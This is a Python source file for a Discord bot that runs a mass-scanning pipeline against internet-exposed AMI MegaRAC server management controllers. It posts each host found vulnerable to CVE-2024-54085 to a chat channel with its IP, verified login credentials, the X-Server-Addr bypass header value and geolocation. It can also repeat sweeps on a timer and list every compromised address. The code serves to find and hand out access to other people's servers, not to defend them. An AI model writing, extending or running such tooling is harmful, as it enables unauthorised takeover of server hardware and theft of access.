import asyncio, json, os, time
import discord
from discord.ext import commands
import config
from aggregator import Pipeline

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
bot.remove_command("help")

def _load(path, default):
    try:
        with open(path) as f: return set(json.load(f))
    except Exception: return default

def _save(path, s):
    with open(path, "w") as f: json.dump(sorted(s), f, indent=2)

seen = _load(config.SEEN_FILE, set())
vulns = _load(config.VULN_FILE, set())
_watch_task = None

def _embed(r):
    e = discord.Embed(title=f"Vulnerable MegaRAC — {r['ip']}", color=0x3ba55d,
                      url=f"https://{r['ip']}/")
    e.add_field(name="Credentials", value=f"`{r['user']}` / `{r['pass']}`", inline=False)
    e.add_field(name="Bypass header", value=f"`X-Server-Addr: {r['bypass']}`", inline=True)
    e.add_field(name="Geo", value=r.get("geo", "?"), inline=True)
    e.add_field(name="CVE", value="CVE-2024-54085 (verified login)", inline=False)
    return e

@bot.event
async def on_ready():
    print(f"[+] {bot.user} online | {len(seen)} seen | {len(vulns)} vulns")

@bot.command(name="scan")
async def scan(ctx, mode: str = "new"):
    msg = await ctx.send(f"Scanning (mode={mode})... this may take a bit.")
    pipe = Pipeline(seen)
    async def prog(t):
        try: await msg.edit(content=f"Scanning... {t}")
        except Exception: pass
    res = await pipe.run(full=(mode == "full"), on_progress=prog)
    _save(config.SEEN_FILE, seen)

    fresh = [r for r in res["vulns"] if r["ip"] not in vulns]
    for r in fresh:
        vulns.add(r["ip"])
        await ctx.send(embed=_embed(r))
    _save(config.VULN_FILE, vulns)

    await msg.edit(content=(f"Done. candidates={res['candidates']} "
                            f"confirmed={res['confirmed']} new_vulns={len(fresh)}"))

@bot.command(name="watch")
async def watch(ctx, minutes: int = None):
    global _watch_task
    minutes = minutes or config.WATCH_MINUTES
    if _watch_task and not _watch_task.done():
        await ctx.send("Watch already running. Use !stop.")
        return
    await ctx.send(f"Watch started: every {minutes} min.")
    _watch_task = bot.loop.create_task(_loop(ctx.channel, minutes))

async def _loop(channel, minutes):
    while True:
        try:
            pipe = Pipeline(seen)
            res = await pipe.run(full=False)
            _save(config.SEEN_FILE, seen)
            for r in res["vulns"]:
                if r["ip"] not in vulns:
                    vulns.add(r["ip"]); _save(config.VULN_FILE, vulns)
                    await channel.send(embed=_embed(r))
        except Exception as e:
            print("watch error:", e)
        await asyncio.sleep(minutes * 60)

@bot.command(name="stop")
async def stop(ctx):
    global _watch_task
    if _watch_task and not _watch_task.done():
        _watch_task.cancel(); _watch_task = None
        await ctx.send("Watch stopped.")
    else:
        await ctx.send("Watch not running.")

@bot.command(name="vulns")
async def listvulns(ctx):
    if not vulns:
        await ctx.send("No vulnerable IPs yet."); return
    await ctx.send("```\n" + "\n".join(sorted(vulns)) + "\n```")

@bot.command(name="status")
async def status(ctx):
    await ctx.send(f"seen={len(seen)} vulns={len(vulns)} "
                   f"watch={'on' if _watch_task and not _watch_task.done() else 'off'} "
                   f"concurrency={config.VERIFY_CONCURRENCY}")

@bot.command(name="sources")
async def sources(ctx):
    from sources import SOURCES
    names = ", ".join(n for n, _ in SOURCES)
    await ctx.send(f"{len(SOURCES)} zero-key sources + 2 methods (/24 expand, ASN sweep):\n"
                   f"`{names}`")

@bot.command(name="help")
async def help_(ctx):
    await ctx.send("`!scan [new|full]` `!watch [min]` `!stop` `!vulns` `!status` `!sources`")

if __name__ == "__main__":
    bot.run(config.DISCORD_TOKEN)
